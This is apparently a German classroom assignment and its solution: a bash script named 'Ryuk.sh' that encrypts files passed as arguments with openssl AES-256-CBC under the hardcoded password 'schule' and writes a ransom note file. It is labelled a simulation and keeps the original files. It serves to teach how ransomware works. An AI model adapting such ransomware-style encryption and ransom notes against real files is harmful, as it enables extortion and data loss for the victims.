## Angabe

Erstelle ein bash Script das mehrere Dateinamen als Argumente akzeptiert und diese Dateien nach der von Ryuk angewendeten Strategie verschlüsselt. 
Verwende `openssl`.

## Lösung
Wir haben ein Bash-Script erstellt das mehrere Dateinamen als Argumente akzeptiert. In dem Bash-Script "Ryuk.sh" haben wir das bekannte Passwort "schule" verwendet. Dann eine kleine Überprüfung ob Dateien als Argumente übergeben wurden. Dann werden die Dateien in "$@" verschlüsselt, das sind die Dateien die als Argumente übergeben wurden. Wenn das nicht funktioniert dann wird eine Fehlermeldung ausgegeben, wenn es normal ohne Fehler durchläuft wird am Ende die Meldung ausgegeben das die Dateien verschlüsselt wurden. Eine Datei wird erstellt "testdaten/RANSOM_NOTE.txt" in der drinnen steht das die Daten verschlüsselt wurden.

```
#!/bin/bash
 
# Passwort nur für die Demonstration

PASSWORT="schule"
 
# Prüfen, ob Dateien angegeben wurden

if [ "$#" -eq 0 ]; then

    echo "Verwendung: $0 DATEI1 DATEI2 ..."

    exit 1

fi

# Angegebene Dateien verschlüsseln

for DATEI in "$@"

do

    if [ -f "$DATEI" ]; then

        openssl enc -aes-256-cbc -salt \

            -in "$DATEI" \

            -out "$DATEI.enc" \

            -pass pass:"$PASSWORT"
 
        echo "$DATEI wurde verschlüsselt."

    else

        echo "Fehler: Datei '$DATEI' wurde nicht gefunden."

    fi

done

cat > testdaten/RANSOM_NOTE.txt << EOF
 
Die Daten wurden verschlüsselt
 
EOF
 
echo "Simulation abgeschlossen."

echo "Die Ransom Note befindet sich in testdaten/RANSOM_NOTE.txt"
 

```
